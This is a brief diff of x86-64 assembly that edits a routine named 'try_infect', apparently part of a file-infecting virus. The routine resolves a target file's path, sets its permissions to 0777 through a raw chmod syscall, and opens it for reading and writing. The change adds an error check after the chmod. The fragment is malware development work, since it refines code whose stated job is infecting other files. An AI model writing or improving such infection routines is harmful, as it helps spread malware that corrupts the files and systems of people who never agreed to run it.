@@ -257,11 +257,11 @@ try_infect:
     call get_full_path
 
     mov rdi, rdx
-    push rdi
     mov rsi, 0o777
     mov rax, SYS_CHMOD
     syscall
-    pop rdi
+    test rax, rax
+    jl exit
 
     mov rsi, O_RDWR
     xor rdx, rdx
